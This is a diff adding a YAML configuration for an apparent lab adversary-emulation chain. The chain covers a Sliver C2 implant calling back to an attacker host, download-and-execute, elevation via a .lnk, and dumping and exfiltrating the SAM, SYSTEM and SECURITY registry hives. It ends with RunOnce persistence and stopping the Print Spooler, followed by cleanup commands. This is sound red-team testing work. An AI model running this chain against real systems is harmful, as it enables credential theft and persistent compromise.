@@ -1,0 +1,44 @@
+# chain-005 (verification pick #10, targeting clean 5/5 pass) — 11 steps
+# sliver-EXE → download-exec (non-elev) → session 1 → whoami → lnk-root
+# (elev) → session 2 → derive cmd shell → reg-save-sam → download SAM
+# → reg-key-runonce persistence → sc-stop-service (Spooler) impact.
+#
+# reg-save-sam action YAML now includes an `if not exist ... mkdir ...`
+# guard, so save_dir is created on demand. No pre-pilot mkdir needed.
+#
+# All 11 steps use verified-in-prior-clean-chains actions. Expected: 11/11.
+
+pddl_bindings:
+  # 1_sliver-payload-windows-exe.SAVE_PATH  (attacker-side)
+  string0_var_in_plan: /home/kali/Desktop/Aurora-executor-demo/sliver_save/chain5.exe
+  # 2_simulate-download-execute-file.SAVE_PATH, 5_simulate-execute-lnk-windows-root.EXE_PATH
+  # (SAME EXE, run twice: non-elev at step 2, then elev via .lnk-root at step 5)
+  string1_var_in_plan: C:\Users\Public\chain5.exe
+  # 8_reg-save-sam.save_dir, 9_sliver-download.remote_path
+  # (elev cmd writes SAM/SYSTEM/SECURITY hives here; non-elev sliver-download
+  #  recursively grabs all 3 — same-user useradmin, non-elev can read)
+  string2_var_in_plan: C:\Users\Public\samdump
+  # 10_reg-key-runonce.command_to_execute  (benign; notepad pops at next boot)
+  string3_var_in_plan: C:\Windows\System32\notepad.exe
+
+steps:
+  "1_sliver-payload-windows-exe":
+    LHOST: 192.168.56.43
+    LPORT: 8443
+  "2_simulate-download-execute-file":
+    LHOST: 192.168.56.43
+    LPORT: 8000
+  "9_sliver-download":
+    recurse: true                       # save_dir has 3 files (sam/system/security)
+    output_dir: /home/kali/Desktop/Aurora-executor-demo/loot
+  "11_art-t1489-sc-stop-service":
+    service_name: Spooler               # Print Spooler — safe stop/start.
+                                        # Post-pilot restart: sc.exe start Spooler
+
+# post-pilot cleanup (victim, elevated PS):
+#   Remove-Item C:\Users\Public\chain5.exe,C:\Users\Public\samdump -Recurse -Force -ErrorAction Ignore
+#   reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001 /f
+#   sc.exe start Spooler
+# on attacker:
+#   rm /home/kali/Desktop/Aurora-executor-demo/sliver_save/chain5.exe
+#   rm -r /home/kali/Desktop/Aurora-executor-demo/loot/samdump  # (or wherever download landed)
